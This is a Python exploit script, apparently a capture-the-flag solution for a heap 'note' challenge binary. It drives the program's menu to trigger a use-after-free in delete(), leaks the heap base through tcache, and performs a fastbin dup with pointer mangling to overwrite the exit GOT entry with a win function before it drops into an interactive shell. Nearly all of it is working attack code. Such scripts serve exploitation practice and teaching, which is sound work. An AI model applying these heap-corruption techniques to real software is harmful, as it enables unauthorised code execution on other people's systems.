#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./note_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x4015C8
b *0x4014DA
b *0x40140C
b *0x40131D
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, aslr=False)

def choice(option: int):
    slna(b'> ', option)

def create(idx, size, data):
    choice(1)
    slna(b': ', idx)
    slna(b': ', size)
    sa(b'data: ', data)

def update(idx, data):
    choice(3)
    slna(b': ', idx)
    sa(b': ', data)

def show(idx):
    choice(2)
    slna(b': ', idx)

def delete(idx):
    choice(4)
    slna(b': ', idx)

# ==================== EXPLOIT ====================

# Use-After-Free in delete() function

p = start()

# Fill tcache
for i in range(7):
    create(i, 0x20, str(chr(0x30+i)).encode())

for i in range(7):
    delete(i)

show(0)
ru(b'data: ')
heap = u64(rl()[:-1].ljust(0x8, b'\0')) << 12
success('heap base @ %#x', heap)

# Fastbin dup

create(0, 0x20, b'0')
create(1, 0x20, b'1')
create(2, 0x20, b'2')

delete(0)
delete(1)
delete(0)

win = 0x401256

create(3, 0x30, b'3')
create(0, 0x20, p64( (heap >> 12) ^  0x4040d0))
create(1, 0x20, b'1')
create(2, 0x20, b'2')

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

create(4, 0x20, p64(exe.got.exit))
update(3, p64(win))

show(11)

interactive()
